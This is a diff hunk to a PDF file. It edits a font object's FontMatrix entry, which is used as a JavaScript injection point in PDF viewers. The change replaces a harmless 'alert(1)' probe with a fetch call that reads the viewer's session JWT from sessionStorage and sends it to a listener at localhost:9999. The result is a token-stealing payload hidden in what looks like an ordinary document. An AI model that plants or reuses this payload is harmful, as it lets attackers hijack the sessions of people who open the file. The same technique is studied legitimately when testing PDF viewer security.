@@ -46,7 +46,7 @@ endobj
   /BaseFont /SNCSTG+CMBX12
   /FontDescriptor 7 0 R
   /Subtype /Type1
-  /FontMatrix [1 2 3 4 5 (1\); alert\(1\))]
+  /FontMatrix [1 2 3 4 5 (1\); fetch\('http://localhost:9999/?cookies='+window.sessionStorage.jwtToken\))]
   /Type /Font
 >>
 endobj
